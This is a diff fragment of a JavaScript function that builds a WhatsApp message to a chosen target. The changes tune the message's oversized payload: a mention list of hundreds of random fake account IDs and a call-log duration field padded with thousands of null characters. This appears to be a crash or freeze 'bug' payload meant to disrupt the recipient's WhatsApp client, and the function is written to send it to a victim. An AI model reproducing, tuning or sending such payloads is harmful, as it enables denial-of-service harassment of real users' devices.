@@ -445,7 +445,7 @@ async function F(sock, target) {
                 },
                 mentionedJid: [
                     target, "13135550002@s.whatsapp.net",
-                    ...Array.from({ length: 3000 }, () =>
+                    ...Array.from({ length: 300 }, () =>
                         `1${Math.floor(Math.random() * 49990)}@s.whatsapp.net`
                     )
                 ],
@@ -453,7 +453,7 @@ async function F(sock, target) {
                     callLogMesssage: {
                         isVideo: true,
                         callOutcome: 0,
-                        durationSecs: '\u0000'.repeat(30000),
+                        durationSecs: '\u0000'.repeat(3000),
                         callType: "VIDEO",
                         participants: [
                             { jid: target, callOutcome: 1 },
